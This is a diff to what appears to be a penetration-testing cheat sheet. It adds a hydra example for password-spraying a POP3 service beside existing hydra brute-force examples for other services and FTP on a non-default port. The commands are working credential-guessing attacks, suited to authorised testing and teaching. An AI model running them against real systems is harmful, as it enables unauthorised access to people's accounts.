@@ -59,6 +59,10 @@ hydra -l pentester -P /usr/share/wordlists/metasploit/password.lst zev0nlxhh78mf
 
 # Example for ftp in a non default port
 hydra -L users.txt -P pass.txt ftp://$ip:2121
+
+# Attacking a pop3 service
+hydra -L users.txt -p 'Company01!' -f $ip pop3
+
 ```
 
 
